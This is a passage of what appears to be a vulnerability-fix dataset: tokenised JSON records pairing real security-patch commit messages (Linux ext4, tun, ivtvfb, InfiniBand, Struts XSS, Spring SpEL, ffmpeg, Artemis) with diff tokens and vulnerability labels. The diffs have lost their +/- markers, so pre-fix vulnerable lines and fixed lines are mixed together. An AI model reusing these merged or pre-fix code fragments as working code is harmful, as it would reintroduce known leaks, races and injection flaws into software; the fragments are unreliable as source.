"EXT4_HT_TRUNCATE", ",", "credits", ")", ";", "if", "(", "IS_ERR", "(", "handle", ")", ")", "{", "ret", "=", "PTR_ERR", "(", "handle", ")", ";", "goto", "out_dio", ";", "goto", "out_mmap", ";", "}", "/", "*", "Expand", "file", "to", "avoid", "data", "loss", "if", "there", "is", "error", "while", "shifting", "*", "/", "@", "@", "-", "5741", ",", "7", "+", "5746", ",", "8", "@", "@", "int", "ext4_insert_range", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "len", ")", "out_stop", ":", "ext4_journal_stop", "(", "handle", ")", ";", "out_dio", ":", "out_mmap", ":", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "ext4_inode_resume_unlocked_dio", "(", "inode", ")", ";", "out_mutex", ":", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";", "@", "@", "-", "209", ",", "15", "+", "209", ",", "18", "@", "@", "static", "int", "ext4_dax_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "{", "int", "result", ";", "handle_t", "*", "handle", "=", "NULL", ";", "struct", "super_block", "*", "sb", "=", "file_inode", "(", "vma", "-", ">", "vm_file", ")", "->", "i_sb", ";", "struct", "inode", "*", "inode", "=", "file_inode", "(", "vma", "-", ">", "vm_file", ")", ";", "struct", "super_block", "*", "sb", "=", "inode", "-", ">", "i_sb", ";", "bool", "write", "=", "vmf", "-", ">", "flags", "&", "FAULT_FLAG_WRITE", ";", "if", "(", "write", ")", "{", "sb_start_pagefault", "(", "sb", ")", ";", "file_update_time", "(", "vma", "-", ">", "vm_file", ")", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "handle", "=", "ext4_journal_start_sb", "(", "sb", ",", "EXT4_HT_WRITE_PAGE", ",", "EXT4_DATA_TRANS_BLOCKS", "(", "sb", ")", ");", "}", "}", "else", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "if", "(", "IS_ERR", "(", "handle", ")", ")", "result", "=", "VM_FAULT_SIGBUS", ";", "@", "@", "-", "228", ",", "8", "+", "231", ",", "10", "@", "@", "static", "int", "ext4_dax_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "if", "(", "write", ")", "{", "if", "(", "!", "IS_ERR", "(", "handle", ")", ")", "ext4_journal_stop", "(", "handle", ")", ";", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "sb_end_pagefault", "(", "sb", ")", ";", "}", "}", "else", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "return", "result", ";", "}", "@", "@", "-", "246", ",", "10", "+", "251", ",", "12", "@", "@", "static", "int", "ext4_dax_pmd_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "unsigned", "long", "addr", ",", "if", "(", "write", ")", "{", "sb_start_pagefault", "(", "sb", ")", ";", "file_update_time", "(", "vma", "-", ">", "vm_file", ")", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "handle", "=", "ext4_journal_start_sb", "(", "sb", ",", "EXT4_HT_WRITE_PAGE", ",", "ext4_chunk_trans_blocks", "(", "inode", ",", "PMD_SIZE", "/", "PAGE_SIZE", ")", ");", "}", "}", "else", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "if", "(", "IS_ERR", "(", "handle", ")", ")", "result", "=", "VM_FAULT_SIGBUS", ";", "@", "@", "-", "260", ",", "30", "+", "267", ",", "71", "@", "@", "static", "int", "ext4_dax_pmd_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "unsigned", "long", "addr", ",", "if", "(", "write", ")", "{", "if", "(", "!", "IS_ERR", "(", "handle", ")", ")", "ext4_journal_stop", "(", "handle", ")", ";", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "sb_end_pagefault", "(", "sb", ")", ";", "}", "}", "else", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "return", "result", ";", "}", "static", "int", "ext4_dax_mkwrite", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "{", "return", "dax_mkwrite", "(", "vma", ",", "vmf", ",", "ext4_get_block_dax", ",", "ext4_end_io_unwritten", ")", ";", "int", "err", ";", "struct", "inode", "*", "inode", "=", "file_inode", "(", "vma", "-", ">", "vm_file", ")", ";", "sb_start_pagefault", "(", "inode", "-", ">", "i_sb", ")", ";", "file_update_time", "(", "vma", "-", ">", "vm_file", ")", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "err", "=", "__dax_mkwrite", "(", "vma", ",", "vmf", ",", "ext4_get_block_dax", ",", "ext4_end_io_unwritten", ")", ";", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "sb_end_pagefault", "(", "inode", "-", ">", "i_sb", ")", ";", "return", "err", ";", "}", "/", "*", "*", "Handle", "write", "fault", "for", "VM_MIXEDMAP", "mappings", ".", "Similarly", "to", "ext4_dax_mkwrite", "(", ")", "*", "handler", "we", "check", "for", "races", "agaist", "truncate", ".", "Note", "that", "since", "we", "cycle", "through", "*", "i_mmap_sem", ",", "we", "are", "sure", "that", "also", "any", "hole", "punching", "that", "began", "before", "we", "*", "were", "called", "is", "finished", "by", "now", "and", "so", "if", "it", "included", "part", "of", "the", "file", "we", "*", "are", "working", "on", ",", "our", "pte", "will", "get", "unmapped", "and", "the", "check", "for", "pte_same", "(", ")", "in", "*", "wp_pfn_shared", "(", ")", "fails", ".", "Thus", "fault", "gets", "retried", "and", "things", "work", "out", "as", "*", "desired", ".", "*", "/", "static", "int", "ext4_dax_pfn_mkwrite", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "{", "struct", "inode", "*", "inode", "=", "file_inode", "(", "vma", "-", ">", "vm_file", ")", ";", "struct", "super_block", "*", "sb", "=", "inode", "-", ">", "i_sb", ";", "int", "ret", "=", "VM_FAULT_NOPAGE", ";", "loff_t", "size", ";", "sb_start_pagefault", "(", "sb", ")", ";", "file_update_time", "(", "vma", "-", ">", "vm_file", ")", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "size", "=", "(", "i_size_read", "(", "inode", ")", "+", "PAGE_SIZE", "-", "1", ")", ">", ">", "PAGE_SHIFT", ";", "if", "(", "vmf", "-", ">", "pgoff", ">", "=", "size", ")", "ret", "=", "VM_FAULT_SIGBUS", ";", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "sb_end_pagefault", "(", "sb", ")", ";", "return", "ret", ";", "}", "static", "const", "struct", "vm_operations_struct", "ext4_dax_vm_ops", "=", "{", ".", "fault", "=", "ext4_dax_fault", ",", ".", "pmd_fault", "=", "ext4_dax_pmd_fault", ",", ".", "page_mkwrite", "=", "ext4_dax_mkwrite", ",", ".", "pfn_mkwrite", "=", "dax_pfn_mkwrite", ",", ".", "pfn_mkwrite", "=", "ext4_dax_pfn_mkwrite", ",", "}", ";", "#", "else", "#", "define", "ext4_dax_vm_ops", "ext4_file_vm_ops", "#", "endif", "static", "const", "struct", "vm_operations_struct", "ext4_file_vm_ops", "=", "{", ".", "fault", "=", "filemap_fault", ",", ".", "fault", "=", "ext4_filemap_fault", ",", ".", "map_pages", "=", "filemap_map_pages", ",", ".", "page_mkwrite", "=", "ext4_page_mkwrite", ",", "}", ";", "@", "@", "-", "3623", ",", "6", "+", "3623", ",", "15", "@", "@", "int", "ext4_punch_hole", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "length", ")", "}", "/", "*", "Wait", "all", "existing", "dio", "workers", ",", "newcomers", "will", "block", "on", "i_mutex", "*", "/", "ext4_inode_block_unlocked_dio", "(", "inode", ")", ";", "inode_dio_wait", "(", "inode", ")", ";", "/", "*", "*", "Prevent", "page", "faults", "from", "reinstantiating", "pages", "we", "have", "released", "from", "*", "page", "cache", ".", "*", "/", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "first_block_offset", "=", "round_up", "(", "offset", ",", "sb", "-", ">", "s_blocksize", ")", ";", "last_block_offset", "=", "round_down", "(", "(", "offset", "+", "length", ")", ",", "sb", "-", ">", "s_blocksize", ")", "-", "1", ";", "@", "@", "-", "3631", ",", "10", "+", "3640", ",", "6", "@", "@", "int", "ext4_punch_hole", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "length", ")", "truncate_pagecache_range", "(", "inode", ",", "first_block_offset", ",", "last_block_offset", ")", ";", "/", "*", "Wait", "all", "existing", "dio", "workers", ",", "newcomers", "will", "block", "on", "i_mutex", "*", "/", "ext4_inode_block_unlocked_dio", "(", "inode", ")", ";", "inode_dio_wait", "(", "inode", ")", ";", "if", "(", "ext4_test_inode_flag", "(", "inode", ",", "EXT4_INODE_EXTENTS", ")", ")", "credits", "=", "ext4_writepage_trans_blocks", "(", "inode", ")", ";", "else", "@", "@", "-", "3680", ",", "16", "+", "3685", ",", "12", "@", "@", "int", "ext4_punch_hole", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "length", ")", "if", "(", "IS_SYNC", "(", "inode", ")", ")", "ext4_handle_sync", "(", "handle", ")", ";", "/", "*", "Now", "release", "the", "pages", "again", "to", "reduce", "race", "window", "*", "/", "if", "(", "last_block_offset", ">", "first_block_offset", ")", "truncate_pagecache_range", "(", "inode", ",", "first_block_offset", ",", "last_block_offset", ")", ";", "inode", "-", ">", "i_mtime", "=", "inode", "-", ">", "i_ctime", "=", "ext4_current_time", "(", "inode", ")", ";", "ext4_mark_inode_dirty", "(", "handle", ",", "inode", ")", ";", "out_stop", ":", "ext4_journal_stop", "(", "handle", ")", ";", "out_dio", ":", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "ext4_inode_resume_unlocked_dio", "(", "inode", ")", ";", "out_mutex", ":", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";", "@", "@", "-", "4823", ",", "13", "+", "4824", ",", "15", "@", "@", "int", "ext4_setattr", "(", "struct", "dentry", "*", "dentry", ",", "struct", "iattr", "*", "attr", ")", "}", "else", "ext4_wait_for_tail_page_commit", "(", "inode", ")", ";", "}", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "/", "*", "*", "Truncate", "pagecache", "after", "we", "'", "ve", "waited", "for", "commit", "*", "in", "data", "=", "journal", "mode", "to", "make", "pages", "freeable", ".", "*", "/", "truncate_pagecache", "(", "inode", ",", "inode", "-", ">", "i_size", ")", ";", "if", "(", "shrink", ")", "ext4_truncate", "(", "inode", ")", ";", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "}", "if", "(", "!", "rc", ")", "{", "@", "@", "-", "5278", ",", "6", "+", "5281", ",", "8", "@", "@", "int", "ext4_page_mkwrite", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "sb_start_pagefault", "(", "inode", "-", ">", "i_sb", ")", ";", "file_update_time", "(", "vma", "-", ">", "vm_file", ")", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "/", "*", "Delalloc", "case", "is", "easy", ".", "..", "*", "/", "if", "(", "test_opt", "(", "inode", "-", ">", "i_sb", ",", "DELALLOC", ")", "&", "&", "!", "ext4_should_journal_data", "(", "inode", ")", "&", "&", "@", "@", "-", "5347", ",", "6", "+", "5352", ",", "19", "@", "@", "int", "ext4_page_mkwrite", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "out_ret", ":", "ret", "=", "block_page_mkwrite_return", "(", "ret", ")", ";", "out", ":", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "sb_end_pagefault", "(", "inode", "-", ">", "i_sb", ")", ";", "return", "ret", ";", "}", "int", "ext4_filemap_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", "{", "struct", "inode", "*", "inode", "=", "file_inode", "(", "vma", "-", ">", "vm_file", ")", ";", "int", "err", ";", "down_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "err", "=", "filemap_fault", "(", "vma", ",", "vmf", ")", ";", "up_read", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "return", "err", ";", "}", "@", "@", "-", "958", ",", "6", "+", "958", ",", "7", "@", "@", "static", "void", "init_once", "(", "void", "*", "foo", ")", "INIT_LIST_HEAD", "(", "&", "ei", "-", ">", "i_orphan", ")", ";", "init_rwsem", "(", "&", "ei", "-", ">", "xattr_sem", ")", ";", "init_rwsem", "(", "&", "ei", "-", ">", "i_data_sem", ")", ";", "init_rwsem", "(", "&", "ei", "-", ">", "i_mmap_sem", ")", ";", "inode_init_once", "(", "&", "ei", "-", ">", "vfs_inode", ")", ";", "}", "@", "@", "-", "10", ",", "8", "+", "10", ",", "10", "@", "@", "*", "/", "static", "inline", "void", "ext4_truncate_failed_write", "(", "struct", "inode", "*", "inode", ")", "{", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "truncate_inode_pages", "(", "inode", "-", ">", "i_mapping", ",", "inode", "-", ">", "i_size", ")", ";", "ext4_truncate", "(", "inode", ")", ";", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "}", "/", "*"], "docstring_tokens": ["race", "conditions"]}
{"contents": ["net/tun:", "fix", "ioctl()", "based", "info", "leaks", "The", "tun", "module", "leaks", "up", "to", "36", "bytes", "of", "memory", "by", "not", "fully", "initializing", "a", "structure", "located", "on", "the", "stack", "that", "gets", "copied", "to", "user", "memory", "by", "the", "TUNGETIFF", "and", "SIOCGIFHWADDR", "ioctl()s.", "Signed-off-by:", "Mathias", "Krause", "<minipli@googlemail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "1379", ",", "9", "+", "1379", ",", "11", "@", "@", "static", "long", "__tun_chr_ioctl", "(", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "int", "vnet_hdr_sz", ";", "int", "ret", ";", "if", "(", "cmd", "=", "=", "TUNSETIFF", "|", "|", "_IOC_TYPE", "(", "cmd", ")", "=", "=", "0x89", ")", "if", "(", "cmd", "=", "=", "TUNSETIFF", "|", "|", "_IOC_TYPE", "(", "cmd", ")", "=", "=", "0x89", ")", "{", "if", "(", "copy_from_user", "(", "&", "ifr", ",", "argp", ",", "ifreq_len", ")", ")", "return", "-", "EFAULT", ";", "}", "else", "memset", "(", "&", "ifr", ",", "0", ",", "sizeof", "(", "ifr", ")", ");", "if", "(", "cmd", "=", "=", "TUNGETFEATURES", ")", "{", "/", "*", "Currently", "this", "just", "means", ":", "\"", "what", "IFF", "flags", "are", "valid", "?", "\"."], "docstring_tokens": ["info", "leaks"]}
{"contents": ["WW-4213", "Non-breaking", "sanitise", "mechanism", "git-svn-id:", "https://svn.apache.org/repos/asf/struts/struts2/trunk@1536698", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["@", "@", "-", "54", ",", "11", "+", "54", ",", "11", "@", "@", "public", "void", "setConfigurationHelper", "(", "ConfigurationHelper", "cfg", ")", "{", "}", "public", "String", "getNamespace", "(", ")", "{", "return", "namespace", ";", "return", "StringEscapeUtils", ".", "escapeHtml4", "(", "namespace", ")", ";", "}", "public", "void", "setNamespace", "(", "String", "namespace", ")", "{", "this", ".", "namespace", "=", "StringEscapeUtils", ".", "escapeEcmaScript", "(", "namespace", ")", ";", "this", ".", "namespace", "=", "namespace", ";", "}", "@", "Inject", "(", "StrutsConstants", ".", "STRUTS_ACTION_EXTENSION", ")", "@", "@", "-", "64", ",", "7", "+", "64", ",", "7", "@", "@", "public", "void", "setDetailView", "(", "String", "detailView", ")", "{", "}", "public", "String", "getNamespace", "(", ")", "{", "return", "namespace", ";", "return", "StringEscapeUtils", ".", "escapeHtml4", "(", "namespace", ")", ";", "}", "@", "Inject", "@", "@", "-", "82", ",", "7", "+", "82", ",", "7", "@", "@", "public", "String", "stripPackage", "(", "Class", "clazz", ")", "{", "}", "public", "void", "setNamespace", "(", "String", "namespace", ")", "{", "this", ".", "namespace", "=", "StringEscapeUtils", ".", "escapeEcmaScript", "(", "namespace", ")", ";", "this", ".", "namespace", "=", "namespace", ";", "}", "public", "String", "getActionName", "(", ")", "{"], "docstring_tokens": ["cross-site", "scripting", "(xss", ")"]}
{"contents": ["V4L/DVB:", "ivtvfb:", "prevent", "reading", "uninitialized", "stack", "memory", "The", "FBIOGET_VBLANK", "device", "ioctl", "allows", "unprivileged", "users", "to", "read", "16", "bytes", "of", "uninitialized", "stack", "memory,", "because", "the", "\"reserved\"", "member", "of", "the", "fb_vblank", "struct", "declared", "on", "the", "stack", "is", "not", "altered", "or", "zeroed", "before", "being", "copied", "back", "to", "the", "user.", "This", "patch", "takes", "care", "of", "it.", "Signed-off-by:", "Dan", "Rosenberg", "<dan.j.rosenberg@gmail.com>", "Signed-off-by:", "Andy", "Walls", "<awalls@md.metrocast.net>", "Signed-off-by:", "Mauro", "Carvalho", "Chehab", "<mchehab@redhat.com>"], "code_tokens": ["@", "@", "-", "466", ",", "6", "+", "466", ",", "8", "@", "@", "static", "int", "ivtvfb_ioctl", "(", "struct", "fb_info", "*", "info", ",", "unsigned", "int", "cmd", ",", "unsigned", "long", "ar", "struct", "fb_vblank", "vblank", ";", "u32", "trace", ";", "memset", "(", "&", "vblank", ",", "0", ",", "sizeof", "(", "struct", "fb_vblank", ")", ");", "vblank", ".", "flags", "=", "FB_VBLANK_HAVE_COUNT", "|", "FB_VBLANK_HAVE_VCOUNT", "|", "FB_VBLANK_HAVE_VSYNC", ";", "trace", "=", "read_reg", "(", "IVTV_REG_DEC_LINE_FIELD", ")", ">", ">", "16", ";"], "docstring_tokens": ["stack", "leak"]}
{"contents": ["Re-use", "EvaluationContext", "in", "DefaultSubscriptionRegistry", "Rather", "than", "create", "a", "new", "EvaluationContext", "instance", "per", "evaluation,", "we", "now", "create", "a", "statically", "shared", "instance,", "without", "the", "root", "object", "in", "it,", "and", "re-use", "it", "for", "all", "evalutations."], "code_tokens": ["@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "26", ",", "15", "+", "26", ",", "14", "@", "@", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentMap", ";", "import", "java", ".", "util", ".", "concurrent", ".", "CopyOnWriteArraySet", ";", "import", "org", ".", "springframework", ".", "expression", ".", "AccessException", ";", "import", "org", ".", "springframework", ".", "expression", ".", "EvaluationContext", ";", "import", "org", ".", "springframework", ".", "expression", ".", "Expression", ";", "import", "org", ".", "springframework", ".", "expression", ".", "ExpressionParser", ";", "import", "org", ".", "springframework", ".", "expression", ".", "PropertyAccessor", ";", "import", "org", ".", "springframework", ".", "expression", ".", "TypedValue", ";", "import", "org", ".", "springframework", ".", "expression", ".", "spel", ".", "SpelEvaluationException", ";", "import", "org", ".", "springframework", ".", "expression", ".", "spel", ".", "standard", ".", "SpelExpressionParser", ";", "import", "org", ".", "springframework", ".", "expression", ".", "spel", ".", "support", ".", "StandardEvaluationContext", ";", "import", "org", ".", "springframework", ".", "expression", ".", "spel", ".", "support", ".", "SimpleEvaluationContext", ";", "import", "org", ".", "springframework", ".", "lang", ".", "Nullable", ";", "import", "org", ".", "springframework", ".", "messaging", ".", "Message", ";", "import", "org", ".", "springframework", ".", "messaging", ".", "MessageHeaders", ";", "@", "@", "-", "65", ",", "6", "+", "64", ",", "11", "@", "@", "/", "**", "Default", "maximum", "number", "of", "entries", "for", "the", "destination", "cache", ":", "1024", "*", "/", "public", "static", "final", "int", "DEFAULT_CACHE_LIMIT", "=", "1024", ";", "/", "**", "Static", "evaluation", "context", "to", "re", "-", "use", "*", "/", "private", "static", "SimpleEvaluationContext", "evaluationContext", "=", "SimpleEvaluationContext", ".", "builder", "(", ")", ".", "propertyAccessor", "(", "new", "SimpMessageHeaderPropertyAccessor", "(", "))", ".", "build", "(", ");", "private", "PathMatcher", "pathMatcher", "=", "new", "AntPathMatcher", "(", ");", "@", "@", "-", "192", ",", "7", "+", "196", ",", "6", "@", "@", "public", "void", "unregisterAllSubscriptions", "(", "String", "sessionId", ")", "{", "if", "(", "!", "this", ".", "selectorHeaderInUse", ")", "{", "return", "allMatches", ";", "}", "EvaluationContext", "context", "=", "null", ";", "MultiValueMap", "<", "String", ",", "String", ">", "result", "=", "new", "LinkedMultiValueMap", "<", ">(", "allMatches", ".", "size", "(", "))", ";", "for", "(", "String", "sessionId", ":", "allMatches", ".", "keySet", "(", "))", "{", "for", "(", "String", "subId", ":", "allMatches", ".", "get", "(", "sessionId", ")", ")", "{", "@", "@", "-", "209", ",", "12", "+", "212", ",", "8", "@", "@", "public", "void", "unregisterAllSubscriptions", "(", "String", "sessionId", ")", "{", "result", ".", "add", "(", "sessionId", ",", "subId", ")", ";", "continue", ";", "}", "if", "(", "context", "=", "=", "null", ")", "{", "context", "=", "new", "StandardEvaluationContext", "(", "message", ")", ";", "context", ".", "getPropertyAccessors", "(", ").", "add", "(", "new", "SimpMessageHeaderPropertyAccessor", "(", "))", ";", "}", "try", "{", "if", "(", "Boolean", ".", "TRUE", ".", "equals", "(", "expression", ".", "getValue", "(", "context", ",", "Boolean", ".", "class", ")", "))", "{", "if", "(", "Boolean", ".", "TRUE", ".", "equals", "(", "expression", ".", "getValue", "(", "evaluationContext", ",", "message", ",", "Boolean", ".", "class", ")", "))", "{", "result", ".", "add", "(", "sessionId", ",", "subId", ")", ";", "}", "}", "@", "@", "-", "533", ",", "7", "+", "532", ",", "7", "@", "@", "public", "String", "toString", "(", ")", "{", "@", "Override", "public", "Class", "<", "?>", "[]", "getSpecificTargetClasses", "(", ")", "{", "return", "new", "Class", "<", "?>", "[]", "{", "MessageHeaders", ".", "class", "}", ";", "return", "new", "Class", "<", "?>", "[]", "{", "Message", ".", "class", ",", "MessageHeaders", ".", "class", "}", ";", "}", "@", "Override", "@", "@", "-", "542", ",", "21", "+", "541", ",", "29", "@", "@", "public", "boolean", "canRead", "(", "EvaluationContext", "context", ",", "@", "Nullable", "Object", "target", ",", "Strin", "}", "@", "Override", "public", "TypedValue", "read", "(", "EvaluationContext", "context", ",", "@", "Nullable", "Object", "target", ",", "String", "name", ")", "throws", "AccessException", "{", "Assert", ".", "state", "(", "target", "instanceof", "MessageHeaders", ",", "\"", "No", "MessageHeaders", "\"", ");", "MessageHeaders", "headers", "=", "(", "MessageHeaders", ")", "target", ";", "SimpMessageHeaderAccessor", "accessor", "=", "MessageHeaderAccessor", ".", "getAccessor", "(", "headers", ",", "SimpMessageHeaderAccessor", ".", "class", ")", ";", "Assert", ".", "state", "(", "accessor", "!", "=", "null", ",", "\"", "No", "SimpMessageHeaderAccessor", "\"", ");", "public", "TypedValue", "read", "(", "EvaluationContext", "context", ",", "@", "Nullable", "Object", "target", ",", "String", "name", ")", "{", "Object", "value", ";", "if", "(", "\"", "destination", "\"", ".", "equalsIgnoreCase", "(", "name", ")", ")", "{", "value", "=", "accessor", ".", "getDestination", "(", ");", "if", "(", "target", "instanceof", "Message", ")", "{", "value", "=", "name", ".", "equals", "(", "\"", "headers", "\"", ")", "?", "(", "(", "Message", ")", "target", ")", ".", "getHeaders", "(", ")", ":", "null", ";", "}", "else", "{", "value", "=", "accessor", ".", "getFirstNativeHeader", "(", "name", ")", ";", "if", "(", "value", "=", "=", "null", ")", "{", "value", "=", "headers", ".", "get", "(", "name", ")", ";", "else", "if", "(", "target", "instanceof", "MessageHeaders", ")", "{", "MessageHeaders", "headers", "=", "(", "MessageHeaders", ")", "target", ";", "SimpMessageHeaderAccessor", "accessor", "=", "MessageHeaderAccessor", ".", "getAccessor", "(", "headers", ",", "SimpMessageHeaderAccessor", ".", "class", ")", ";", "Assert", ".", "state", "(", "accessor", "!", "=", "null", ",", "\"", "No", "SimpMessageHeaderAccessor", "\"", ");", "if", "(", "\"", "destination", "\"", ".", "equalsIgnoreCase", "(", "name", ")", ")", "{", "value", "=", "accessor", ".", "getDestination", "(", ");", "}", "else", "{", "value", "=", "accessor", ".", "getFirstNativeHeader", "(", "name", ")", ";", "if", "(", "value", "=", "=", "null", ")", "{", "value", "=", "headers", ".", "get", "(", "name", ")", ";", "}", "}", "}", "else", "{", "/", "/", "Should", "never", "happen", ".", "..", "throw", "new", "IllegalStateException", "(", "\"", "Expected", "Message", "or", "MessageHeaders", ".", "\")", ";", "}", "return", "new", "TypedValue", "(", "value", ")", ";", "}"], "docstring_tokens": ["remote", "code", "execution"]}
{"contents": ["IB/uverbs:", "Prevent", "integer", "overflow", "in", "ib_umem_get", "address", "arithmetic", "Properly", "verify", "that", "the", "resulting", "page", "aligned", "end", "address", "is", "larger", "than", "both", "the", "start", "address", "and", "the", "length", "of", "the", "memory", "area", "requested.", "Both", "the", "start", "and", "length", "arguments", "for", "ib_umem_get", "are", "controlled", "by", "the", "user.", "A", "misbehaving", "user", "can", "provide", "values", "which", "will", "cause", "an", "integer", "overflow", "when", "calculating", "the", "page", "aligned", "end", "address.", "This", "overflow", "can", "cause", "also", "miscalculation", "of", "the", "number", "of", "pages", "mapped,", "and", "additional", "logic", "issues.", "Addresses:", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Shachar", "Raindel", "<raindel@mellanox.com>", "Signed-off-by:", "Jack", "Morgenstein", "<jackm@mellanox.com>", "Signed-off-by:", "Or", "Gerlitz", "<ogerlitz@mellanox.com>", "Signed-off-by:", "Roland", "Dreier", "<roland@purestorage.com>"], "code_tokens": ["@", "@", "-", "99", ",", "6", "+", "99", ",", "14", "@", "@", "struct", "ib_umem", "*", "ib_umem_get", "(", "struct", "ib_ucontext", "*", "context", ",", "unsigned", "long", "addr", ",", "if", "(", "dmasync", ")", "dma_set_attr", "(", "DMA_ATTR_WRITE_BARRIER", ",", "&", "attrs", ")", ";", "/", "*", "*", "If", "the", "combination", "of", "the", "addr", "and", "size", "requested", "for", "this", "memory", "*", "region", "causes", "an", "integer", "overflow", ",", "return", "error", ".", "*", "/", "if", "(", "(", "PAGE_ALIGN", "(", "addr", "+", "size", ")", "<", "=", "size", ")", "|", "|", "(", "PAGE_ALIGN", "(", "addr", "+", "size", ")", "<", "=", "addr", ")", ")", "return", "ERR_PTR", "(", "-", "EINVAL", ")", ";", "if", "(", "!", "can_do_mlock", "(", "))", "return", "ERR_PTR", "(", "-", "EPERM", ")", ";"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["avcodec/vqavideo:", "Set", "video", "size", "Fixes:", "out", "of", "array", "access", "Fixes:", "15919/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_VQA_fuzzer-5657368257363968", "Found-by:", "continuous", "fuzzing", "process", "https://github.com/google/oss-fuzz/tree/master/projects/ffmpeg", "Signed-off-by:", "Michael", "Niedermayer", "<michael@niedermayer.cc>"], "code_tokens": ["@", "@", "-", "147", ",", "7", "+", "147", ",", "7", "@", "@", "static", "av_cold", "int", "vqa_decode_init", "(", "AVCodecContext", "*", "avctx", ")", "}", "s", "-", ">", "width", "=", "AV_RL16", "(", "&", "s", "-", ">", "avctx", "-", ">", "extradata", "[", "6", "]", ");", "s", "-", ">", "height", "=", "AV_RL16", "(", "&", "s", "-", ">", "avctx", "-", ">", "extradata", "[", "8", "]", ");", "if", "(", "(", "ret", "=", "av_image_check_size", "(", "s", "-", ">", "width", ",", "s", "-", ">", "height", ",", "0", ",", "avctx", ")", ")", "<", "0", ")", "{", "if", "(", "(", "ret", "=", "ff_set_dimensions", "(", "avctx", ",", "s", "-", ">", "width", ",", "s", "-", ">", "height", ")", ")", "<", "0", ")", "{", "s", "-", ">", "width", "=", "s", "-", ">", "height", "=", "0", ";", "return", "ret", ";", "}"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["ARTEMIS-1482", "Catch", "malformed", "SimpleString"], "code_tokens": ["@", "@", "-", "89", ",", "6", "+", "89", ",", "9", "@", "@", "public", "SimpleString", "readSimpleString", "(", ")", "{", "private", "SimpleString", "readSimpleStringInternal", "(", ")", "{", "int", "len", "=", "buffer", ".", "readInt", "(", ");", "if", "(", "len", ">", "buffer", ".", "readableBytes", "(", "))", "{", "throw", "new", "IndexOutOfBoundsException", "(", ");", "}", "byte", "[", "]", "data", "=", "new", "byte", "[", "len", "]", ";", "buffer", ".", "readBytes", "(", "data", ")", ";", "return", "new", "SimpleString", "(", "data", ")", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "44", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", 